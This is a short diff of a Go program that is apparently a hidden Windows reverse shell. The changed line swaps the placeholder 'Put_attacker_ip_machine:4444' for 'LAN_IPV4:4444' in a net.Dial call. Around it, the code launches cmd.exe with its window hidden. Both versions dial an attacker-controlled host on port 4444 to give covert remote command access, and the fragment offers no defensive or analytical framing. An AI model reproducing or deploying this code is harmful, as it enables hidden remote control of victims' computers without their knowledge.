@@ -7,7 +7,7 @@ import (
 )
 
 func main() {
-    c, _ := net.Dial("tcp", "Put_attacker_ip_machine:4444")
+    c, _ := net.Dial("tcp", "LAN_IPV4:4444")
     cmd := exec.Command("cmd.exe")
     cmd.SysProcAttr = &syscall.SysProcAttr{
         HideWindow: true,
